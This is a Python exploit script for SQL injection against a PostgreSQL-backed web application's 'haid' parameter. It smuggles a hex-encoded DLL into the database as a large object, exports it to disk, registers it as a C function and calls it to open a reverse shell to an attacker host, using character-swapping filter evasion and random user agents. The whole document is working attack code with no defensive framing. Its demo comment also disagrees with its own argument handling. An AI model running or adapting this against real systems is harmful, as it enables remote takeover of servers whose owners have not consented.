# DEMONSTRATION:
# $ python3 sqli_pgsql_udf_lo_hex.py method,haid get popUp 192.168.252.14 6969 rev_shell.dll hodor_revshell "1;" ";--" https://192.168.252.15:8443/GraphicalView.do
# [*] Creating LO for UDF injection...
# [*] Injecting hex encoded payload of length 16384 into LO...
# [*] Injecting 5 times of chunklength of 4096...
# [*] Exporting UDF library to filesystem...
# [*] Creating function...
# [*] Launching reverse shell via UDF...
# [*] Deleting existing LO...

#!/usr/bin/python3
import requests
import urllib3
import os
import sys
import re
import base64
import random
import string
from random_useragent.random_useragent import Randomize     # Randomize useragent

# Optionally, use a proxy
# proxy = "http://<user>:<pass>@<proxy>:<port>"
proxy = ""
os.environ['http_proxy'] = proxy
os.environ['HTTP_PROXY'] = proxy
os.environ['https_proxy'] = proxy
os.environ['HTTPS_PROXY'] = proxy

# Disable cert warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Variables
loid = random.randint(1000,9999)
encoding = "hex"
chunk = 4096
def_val = "popUp"
get_post = "get"
inj_param = "haid"
prefix = "1;"
suffix = ";--"
timeout = 10

# Handle CTRL-C
def keyboard_interrupt():
    """Handles keyboardinterrupt exceptions"""
    print("\n\n[*] User requested an interrupt, exiting...")
    exit(1)

# Randomize user-agent
def http_headers():
    # Randomize useragent
    useragent = Randomize().random_agent('desktop', 'windows')
    # HTTP Headers. Might need modification for each webapplication
    headers = {
        'User-Agent': useragent,
    }
    return headers

def random_str(str_len):
    letters = string.ascii_letters
    return ''.join(random.choice(letters) for i in range(str_len))

def encode_payload(raw_payload):
    # Read payload from file and base64 encode
    with open(raw_payload, 'rb') as f:
        if encoding == 'base64':
            b64_bytes = base64.b64encode(f.read())
            payload = b64_bytes.decode('utf-8')
        elif encoding == 'hex':
            payload = f.read().hex()
    return payload

def delete_lo(loid):
    print("[*] Deleting existing LO...")
    sql = "select lo_unlink(" + str(loid) + ")"
    return sql

def create_lo(loid):
    print("[*] Creating LO for UDF injection...")
    sql = "select lo_create(" + str(loid) + ")"
    return sql

def inject_udf(url,headers,loid,payload):
    print("[*] Injecting " + encoding + " encoded payload of length " + str(len(payload)) + " into LO...")
    rounded = round(len(payload) / chunk) + 1           # +1 due to stupid Python 3 handling of rounding
    print("[*] Injecting " + str(rounded) + " times of chunklength of " + str(chunk) + "...")

    for i in range(0, int(rounded)):
        start_chunk = i * chunk
        end_chunk = start_chunk + chunk
        payload_chunk = payload[start_chunk:end_chunk]
        sql = "insert into pg_largeobject (loid,pageno,data) values (" + str(loid) + "," + str(i) + ",decode('" + payload_chunk + "','" + encoding + "'))"
        create_request(url,headers,sql)

def export_udf(loid,write_path_file):
    print("[*] Exporting UDF library to filesystem...")
    sql = "select lo_export(" + str(loid) + ", '" + write_path_file + "')"
    return sql

def create_udf_func(dll_function,write_path_file):
    print("[*] Creating function...")
    sql = "create or replace function " + dll_function + "(text,integer) returns void as '" + write_path_file + "', 'connect_back' language c strict"
    return sql

def trigger_udf(revhost,revport,dll_function):
    print("[*] Launching reverse shell via UDF...")
    sql = "select " + dll_function + "('" + revhost + "', " + str(revport) + ")"
    return sql

def create_request(url,headers,inj_str):
    # print("[*] Using injection string: " + prefix + inj_str + suffix)
    # Optionally modify injection string via regex for character evasion
    inj_regex_str = re.sub(" ","+",inj_str)                     # Replace space for +
    inj_regex_str = re.sub("'","$$",inj_regex_str)              # Replace single quote for $$
    # print("[*] Character evasion string: " + prefix + inj_regex_str + suffix)
    # Injection parameters
    inj_params = {"method":def_val,
                "haid":prefix + inj_regex_str + suffix}
    # Disable URL encoding characters
    params_str = "&".join("%s=%s" % (k,v) for k,v in inj_params.items())
    # Do request
    r = requests.get(url,params=params_str,headers=headers,timeout=timeout,verify=False)

# Main
def main(argv):
    if len(sys.argv) == 6:
        revhost = sys.argv[1]
        revport = sys.argv[2]
        payl = sys.argv[3]
        dll_function = sys.argv[4]
        url = sys.argv[5]
    else:
        print("[*] Usage: " + sys.argv[0] + " <reverse_shell_host> <reverse_shell_port> <payload_file> <dll_function> <url>")
        print("[*] Example: " + sys.argv[0] + " 192.168.252.7 6969 rev_shell.dll hodor_revshell https://192.168.252.14:8443/GraphicalView.do\n")
        exit(0)

    # User Agent
    headers = http_headers()

    # Path to write file
    random_fn = random_str(random.randint(8,16))
    write_path_file = "c:\\users\\public\\" + random_fn + ".dll"

    # Do stuff
    try:
        # Check to see if it is a file to read as an argument
        if os.path.isfile(payl):
            # File exists and keep going
            payload = encode_payload(payl)
        else:
            # Print error and bail, file not there
            print("[!] The following file does not exist: " + payl + "\n")
            exit(-1)

        # Create LO
        create_request(url,headers,create_lo(loid))
        # Inject UDF
        inject_udf(url,headers,loid,payload)
        # Export UDF
        create_request(url,headers,export_udf(loid,write_path_file))
        # Create UDF
        create_request(url,headers,create_udf_func(dll_function,write_path_file))
        # Trigger UDF
        create_request(url,headers,trigger_udf(revhost,revport,dll_function))
        # Delete LO
        create_request(url,headers,delete_lo(loid))

    except requests.exceptions.Timeout:
        print("[!] Timeout error\n")
    except requests.exceptions.TooManyRedirects:
        print("[!] Too many redirects\n")
        exit(-1)
    except requests.exceptions.ConnectionError:
        print("[!] Not able to connect to URL\n")
        exit(-1)
    except requests.exceptions.RequestException as e:
        print("[!] " + str(e))
        exit(-1)
    except requests.exceptions.HTTPError as e:
        print("[!] Failed with error code - " + e.code + "\n")
        exit(-1)
    except KeyboardInterrupt:
        keyboard_interrupt()

# If we were called as a program, go execute the main function.
if __name__ == "__main__":
    main(sys.argv[1:])

